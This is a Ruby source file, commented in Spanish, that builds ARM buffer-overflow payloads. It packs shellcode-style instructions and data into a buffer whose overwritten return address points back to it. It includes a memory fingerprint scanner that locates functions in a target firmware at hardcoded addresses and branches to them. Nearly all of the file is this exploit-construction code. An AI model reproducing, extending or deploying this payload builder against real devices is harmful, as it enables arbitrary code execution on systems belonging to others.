"""
PAYLOAD: Armado para un buffer overflow

-------------                       <- Inicio del buffer
Instrucciones
-------------
Variables (a las que hacen
referencia las instrucciones)
-------------
Padding
-------------
Return Address a sobreescribir
apuntando al inicio del buffer
-------------                       <- Fin del buffer

"""

require_relative 'utils.rb'
require_relative 'fingerprints'

class MyCustomPayload
    
    def initialize(instFinalLen)
        @instFinalLen = instFinalLen # TODO: Este valor se tiene que actualizar cada vez que se genera un payload
        
        @inst = [] # en words
        @data = [] # en bytes
        @instIdx = 0
        @dataIdx = 0
        @address = 0x18a88
        @bufLen = 0x1000
        @padLen = 4
        @INST_SIZE = 4
        @PAD_BYTE = 0x55
        
        # Cada variable artificial almacenada en el stack tiene que tener un tamaño
        # y un delta con respecto a la posición del SP para que se pueda referenciar
        @stackVarSize = []
        @stackVarSPdelta = []
        
        # Para hacerlo mas legible se guarda en un dict las direcciones hardcodeadas de funciones
        # TODO: Deberia funcionar con un solo pivot y las deltas
        @fnAddr = {}
    end

    attr_accessor :fnAddr
    attr_accessor :instFinalLen
    attr_accessor :inst
    attr_accessor :instIdx
    attr_accessor :dataIdx
    attr_accessor :address
    attr_accessor :bufLen
    attr_accessor :padLen
    attr_accessor :INST_SIZE
    attr_accessor :PAD_BYTE
    attr_accessor :stackVarSize
    attr_accessor :stackVarSPdelta

    def addInst (i)
        fail("addInst: " + i.to_s) unless i.class == Fixnum and i >= 0 and i <= 0xFFFFFFFF
        @inst << (i)
        if(getInstLen() > @instFinalLen)
            puts("@instFinalLen quedo corto")
        end
        fail unless getInstLen() <= @instFinalLen
    end
    
    def addData (d)
        dataPos = currDataPos()
        @data.concat(d)
        return dataPos
    end

    def alignData ()
      dataPos = currDataPos()
      if dataPos % 4 != 0
        puts "addAlignedData: esta desalineado"
        @data.concat([0] * (4 - dataPos % 4))
      end
      return currDataPos()
    end

    def getInstLen
        return @inst.length * @INST_SIZE
    end
    
    def packPayload
        ba = []
        for i in @inst
            ba.concat(pack32bitsLittleEndian(i))
        end
        
        #puts("Len: #{getInstLen}")
        if(getInstLen() != @instFinalLen)
            raise Exception.new("No se ajusto instFinalLen, pasarlo a: #{getInstLen()}")
        end
        
        for d in @data
            ba << (d)
        end
        fail unless (ba).length <= @bufLen
#        ba.extend(bytearray([@PAD_BYTE for i in range(@bufLen + @padLen - len(ba))]))
#         (@bufLen + @padLen - ba.length).times { ba << @PAD_BYTE}
#       ba.extend(pack32bitsLittleEndian(@address))
#         ba.concat pack32bitsLittleEndian(@address)
        return ba
    end

    def currPC
        return @address + getInstLen()
    end
    
    def currDataPos
        return @address + @instFinalLen + @data.length
    end
    
    def mov32bToReg(ri, v)
        fail unless v >= 0
        fail unless validRegNum(ri)
        if v <= 0xFF
          addInst genMovReg(ri, v) # Básicamente para no tener tantos 0's en el payload, que es el valor más común que cargo en registros.
          return
        end
        delta = currDataPos() - (currPC() + 8) # +8 segun la doc
        fail unless (delta >= 0)  # TODO: falta ver el negativo
        addInst(genLdrImm(ri, PC_REG, delta))
        addData(pack32bitsLittleEndian(v))
    end

    def addDataString(s)
      s += 0.chr * (4 - s.length % 4) # Se termina el string con el \0 hasta un mult. de 4
      strPos = currDataPos()
      addData(s.unpack("C*"))
      return strPos
    end

    def loadStrAddress(regIdx, s)
      fail unless validRegNum(regIdx)
      strPos = addDataString(s)
      mov32bToReg(regIdx, strPos)
    end

    def bl (dest)
        if((dest).class == Fixnum)
            addInst(genBL(currPC(), dest))
        elsif((dest).class == String)
            addInst(genBL(currPC(), @fnAddr[dest]))
        else
            raise Exception.new("bl(dest): dest type no reconocido: {:s}".format(dest))
        end
    end
    
    def getStackSize
        ts = 0
        for s in @stackVarSize
            ts += s
        end
        return ts
    end
    
    def reserveStack
        addInst(genSubImm(SP_REG, SP_REG, getStackSize()))
    end
    
    def releaseStack
        addInst(genAddImm(SP_REG, SP_REG, getStackSize()))
    end
    
    def addStackVar (varSize)
        varSize = upToMult(varSize, @INST_SIZE)
        fail unless (@stackVarSize).length == @stackVarSPdelta.length
        if @stackVarSPdelta.length > 0
            @stackVarSPdelta << (@stackVarSPdelta[-1] + @stackVarSize[-1])
        else
            @stackVarSPdelta << 0
        end
        @stackVarSize << (varSize)
        return @stackVarSize.length - 1
    end
    
    def loadStVarPos (regIdx, stVarIdx)
        fail unless validRegNum(regIdx)
        fail unless stVarIdx >= 0 and stVarIdx < (@stackVarSPdelta).length
        addInst(genAddImm(regIdx, SP_REG, @stackVarSPdelta[stVarIdx]))
    end

    # Sacado del ejemplo: http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.faqs/ka13544.html (Word by Word memory copy)
    # Copia de a palabras (4-bytes), size se espcifica en bytes, si no es multiplo de 4 copia de más
    def memcpy(dst, src, size, srcReg = R1, dstReg = R0, dataReg = R3, sizeReg = R2)
        fail unless validRegNum(srcReg) and validRegNum(dstReg) and validRegNum(dataReg) and validRegNum(sizeReg)
        fail unless is32aligned(dst) and is32aligned(src)
        fail unless ((size >= 0) and (size <= 0x10000)) # límite superior arbitrario

        # WordCopy
        #   LDR r3, [r1], #4
        #   STR r3, [r0], #4
        #   SUBS r2, r2, #4
        #   BGE WordCopy

        mov32bToReg(srcReg, src)
        mov32bToReg(dstReg, dst)
        mov32bToReg(sizeReg, size)

        wordCopyAddress = currPC
        addInst genLoadPostIndexed(dataReg, srcReg, 4)
        addInst genStorePostIndexed(dataReg, dstReg, 4)
        addInst genSubImm(sizeReg, sizeReg, 4, updateFlags = true)
        addInst genBranch(currPC, wordCopyAddress, condition = COND_GE, linkBranch = false)
    end
    
    # String search: Busca una secuencia de words (4 bytes) en memoria
    # Se pasa por R0 la dirección del string a buscar, por R1 el largo del mismo, y por R2-R3
    # el inicio-final del espacio donde buscar (debe ser word-aligned, cosa que no se verifica)
    # Devuelve en R0 la dirección del string o cero si no lo encontró
    # (se asume que no se va a buscar nada en el vector de interrupciones que está en esa dirección)
    # TODO: Habilitar para que la secuencia buscada también sea de bytes
    # TODO: Optimizar para usar menos registros y poner todo relativo al PC para no tener tantas direcciones hardcodeadas (excepto la del space search)
    def stringSearch(foundLenReg = R4, tempReg1 = R5, tempReg2 = R6)
        
        fail unless validRegNum(foundLenReg) and validRegNum(tempReg1) and validRegNum(tempReg2)

        keyReg = R0
        keyLenReg = R1
        indexReg = R2
        endReg = R3

=begin
        
        El assembly generado partió de la compilación de esta función de prueba que se deja por ahora como referencia
        
        #define SPACE_INI 0x15000
        #define SPACE_SIZE 0x30000
        #define SPACE_END (SPACE_INI + SPACE_SIZE)
        
        int fingerprint[] = {0xe92d40f0, 0xe1a04000, 0xe24dd024};
        #define fpSize (sizeof(fingerprint) / sizeof(int))
        //#define fpSize (3)
        
        int printMemory()
        {
          int *memDir = 0x0;
          int l;
        
          int *i;
          int j = 0;
          i = SPACE_INI;
          while ( i < SPACE_END )
          {
        //    printf("MEM: %x -> DATA: %x\n", i, *i);
        
            if (*i++ == fingerprint[j])
            {
              j++;
              if (j == fpSize)
              {
                printf("FOUND!!\n");
                return i - fpSize;
              }
            }
            else
              j = 0;
          }
          return 0;
        }
=end

      functionAddress = currPC

      # Preservo los registros porque este payload está pensado para ser llamado como una función aparte
      # en forma repetida para encontrar el signature de distintas funciones.
      regList = [indexReg, keyReg, endReg, foundLenReg, tempReg1, tempReg2]

      # PUSH {regList}
      saveRegisters(regList)

      addInst genMovReg(foundLenReg, 0)
      
      searchLoop = currPC

      # TODO: NO puedo hacer referencia a instrucciones a futuro hasta que no se agregan y se sepa exactamente cual es el delta
      # Asi que por ahora esas direcciones quedan con deltas hardcodeados que tienen que ajustarse si se modifica el payload
      foundAddress = searchLoop + 10 * @INST_SIZE
      notFoundAddress = foundAddress + 2 * @INST_SIZE
      endSearchAddress = notFoundAddress + 1 * @INST_SIZE

      # CMP indexReg, endReg
      addInst genCmpReg(indexReg, endReg)
      # BEQ notFoundAddress
      addInst genBranch(currPC, notFoundAddress, condition = COND_EQ, linkBranch = false)
      
      # LDR tempReg1, [keyReg + foundLenReg << 2]
      addInst genLoadStoreScaledRegOffset(tempReg1, keyReg, foundLenReg, 2, SH_LSL, 1, 1, 0, 0, 1)
      # LDR tempReg2, [indexReg], #4 (post-indexed)
      addInst genLoadPostIndexed(tempReg2, indexReg, 4)
      # CMP tempReg1, tempReg2
      addInst genCmpReg(tempReg1, tempReg2)

      # MOVNE foundLenReg, #0
      addInst genDataProc32bitImm(foundLenReg, 0, 0, OP_MOV, updateFlags = false, cond = COND_NE)
      # BNE searchLoop
      addInst genBranch(currPC, searchLoop, condition = COND_NE, linkBranch = false)

      # foundLenReg++ (sin modificar los flags para que siga valiendo si encontró o no parte del string)
      addInst genAddImm(foundLenReg, foundLenReg, 1, updateFlags = false)

      # CMP foundLenReg, keyLenReg
      addInst genCmpReg(foundLenReg, keyLenReg)
      # BNE searchLoop
      addInst genBranch(currPC, searchLoop, condition = COND_NE, linkBranch = false)
      
      # foundAddress = currPC

      # R0 = indexReg - keyLenReg * 4 (dirección donde empieza el string encontrado)
      addInst genDataProcImmShift(R0, indexReg, keyLenReg, 2, SH_LSL, OP_SUB, updateFlags = false, cond = COND_AL)
      # B endSearchAddress (salta al final)
      addInst genBranch(currPC, endSearchAddress, condition = COND_AL, linkBranch = false)
      
      # notFoundAddress = currPC

      # MOV R0, #0 (no se encontró el string)
      addInst genMovReg(R0, 0)
      # addInst genBranch(currPC, currPC, condition = COND_AL, linkBranch = false) # lo dejo trabado si falla para examinar por que

      # endSearchAddress = currPC

      # POP {regList}
      restoreRegisters(regList)

      # BX LR
      addInst genBranchToReg(LR_REG)

      return functionAddress
      
    end

    # PUSH/POP pero obviando los scratch registers R0-R3
    def saveRegisters(regList)
        regList.delete_if { |ri| [R0, R1, R2, R3].include? ri }
        addInst genPush(regList)
    end
    def restoreRegisters(regList)
        regList.delete_if { |ri| [R0, R1, R2, R3].include? ri }
        addInst genPop(regList)
    end

    # PUSH/POP para todos los registros (excepto SP y PC)
    def saveAllRegisters()
        regList = [*0..12] << LR_REG
        addInst genPush(regList)
    end
    def restoreAllRegisters()
        regList = [*0..12] << LR_REG
        addInst genPop(regList)
    end

    # Utiliza el string search para buscar fingerprints (strings) de funciones y devolver su ubicación.
    # Para esto se necesita el fingerprint (con su largo) y un offset desde el fingerprint al comienzo
    # de la función (porque el fingerprint no necesariamente debe ser el preludio de la misma). Se pasa
    # a la función una lista de estos datos y devuelve otra lista con las direcciones encontradas (o cero
    # si no las encontró).
    # Se pasa por R0 la dirección de la función string search, por R1 la lista con los datos de las funciones
    # a buscar (inputList) y por R2 la lista donde se van a escribir las direccione encontradas (outputList).
    # Por R3-R4 (excediendo la call convention) se pasa el ini-end del espacio donde se van a buscar los fingerprints. 
    # TODO: usa muchos registros, podría guardar algo en el stack, pero como no se bien de donde se la va a llamar,
    # lo mejor es que acceda a la menor cantidad de memoria posible.
    #
    #  Input List:
    #                +---------------+
    #                |   # of Func   | 
    #                +---------------+
    #   1st Func     |    FP_LEN     |   FP: Fingerprint
    #                +---------------+
    #                |      FP       |
    #                +---------------+
    #                |     FP + 4    |
    #                +---------------+
    #                |     FP + 8    |
    #                +---------------+
    #                |    .......    |
    #                +---------------+
    #                |    .......    |
    #                +---------------+
    #                |  FP + FP_SIZE |   FP_SIZE = FP_LEN * 4
    #                +---------------+
    #                |    OFFSET     |
    #                +---------------+
    #   2nd Func     |    FP_LEN (2) |
    #                +---------------+
    #                |      FP (2)   |
    #                +---------------+
    #                |               |
    #
    def findFunctionsAddress(stringSearchReg = R5, inputListReg = R6, outputListReg = R7,
        iniSpaceReg = R8, endSpaceReg = R9, remainingFunctionsReg = R10)

        functionAddress = currPC

        # A la lista de registros a guardar se agrega el LR porque esta función llama a otra (string search)
        regList = [stringSearchReg, inputListReg, outputListReg, iniSpaceReg, endSpaceReg, remainingFunctionsReg, LR_REG]

        # PUSH {regList}
        saveRegisters(regList)

        # Paso los argumentos a otros registros para preservarlos (algo de esto es inncesario porque
        # no todos los scratch registers van a ser modificados, pero por las dudas se lo deja lo más prolijo posible).
        # MOV stringSearchReg, R0
        addInst genMovRegToReg(stringSearchReg, R0)
        # MOV inputListReg, R1
        addInst genMovRegToReg(inputListReg, R1)
        # MOV outputListReg, R2
        addInst genMovRegToReg(outputListReg, R2)
        # MOV iniSpaceReg, R3
        addInst genMovRegToReg(iniSpaceReg, R3)
        # MOV endSpaceReg, R4
        addInst genMovRegToReg(endSpaceReg, R4)

        # El primer valor de la lista es cuantas funciones a buscar contiene
        # TODO: Se asume que este valor es mayor a cero, porque se checkea recién al final del loop
        # LDR remainingFunctionsReg, [inputListReg], #4 (post-indexed)
        addInst genLoadPostIndexed(remainingFunctionsReg, inputListReg, 4)

        searchLoop = currPC

        # Preparo los argumentos para hacer el string search
        # El primer dato tiene el largo del fingerprint
        # LDR R1, [inputListReg], #4 (post-indexed)
        addInst genLoadPostIndexed(R1, inputListReg, 4)
        # El dato siguiente tiene el fingerprint
        # MOV R0, inputListReg
        addInst genMovRegToReg(R0, inputListReg)
        # Se avanza el indice de la input list pasando el fingerprint hasta el offset
        # inputListReg += R1 * 4
        addInst genDataProcImmShift(inputListReg, inputListReg, R1, 2, SH_LSL, OP_ADD, updateFlags = false, cond = COND_AL)
        # MOV R2, iniSpaceReg
        addInst genMovRegToReg(R2, iniSpaceReg)
        # MOV R3, endSpaceReg
        addInst genMovRegToReg(R3, endSpaceReg)
        # BLX stringSearchReg
        addInst genBranchToReg(stringSearchReg, condition = COND_AL, linkBranch = true)

        # Se lee el offset del fingerprint a la función
        # LDR R1, [inputListReg], #4 (post-indexed)
        addInst genLoadPostIndexed(R1, inputListReg, 4)
        # Se lo aplica al address que devolvio el string search, solo si es distinto de cero,
        # sino se deja en cero para señalizar que esa función no fue encontrada.
        # CMP R0, 0
        addInst genCmpImm(R0, 0)
        # ADDNE R0, R1
        addInst genDataProcImmShift(R0, R0, R1, 0, SH_LSL, OP_ADD, updateFlags = false, cond = COND_NE)

        # Se guarda el address en la lista
        # STR R0, [outputListReg], #4 (post-indexed)
        addInst genStorePostIndexed(R0, outputListReg, 4)

        # Cuando no hay mas funciones que buscar termina, sino salta al principio y sigue buscando.
        # SUB remainingFunctionsReg, 1 (update flags)
        addInst genDataProc32bitImm(remainingFunctionsReg, remainingFunctionsReg, 1, OP_SUB, updateFlags = true, cond = COND_AL)
        # BNE searchLoop (remainingFunctionsReg != 0)
        addInst genBranch(currPC, searchLoop, condition = COND_NE, linkBranch = false)

        # POP {regList}
        restoreRegisters(regList)

        # BX LR
        addInst genBranchToReg(LR_REG)

        return functionAddress

    end

    # Hace un branch a una funcion encontrada por su fingerprint cuya direccion esta guardada en el functionArray.
    # TODO: Pisa un registro (R7) que no es lo ideal
    def branchToFunc(fname)
      # Se busca en los fingerprints, si no está ahi falla y se debería agregar
      fArrayIdx = 0
      $fingerprints.each do |fp|
        if fp[0] == fname
          break
        else
          fArrayIdx += 1
        end
      end
      fail("No existe la funcion: " + fname) unless (fArrayIdx < $fingerprints.length)

      mov32bToReg(R7, $functionsAddressArray + @INST_SIZE * fArrayIdx)
      addInst genLdrImm(R7, R7, 0)
      addInst genBranchToReg(R7, condition = COND_AL, linkBranch = true)
    end

end

